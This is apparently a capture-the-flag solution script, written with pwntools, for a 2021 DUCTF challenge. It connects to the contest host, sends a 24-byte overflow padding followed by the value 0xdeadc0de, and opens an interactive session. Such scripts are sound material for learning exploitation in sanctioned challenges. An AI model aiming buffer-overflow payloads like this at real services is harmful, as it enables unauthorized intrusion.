from pwn import *

p = remote('pwn-2021.duc.tf', 31916)

payload = b'a'*24
payload += p64(0xdeadc0de)

p.sendline(payload)

p.interactive()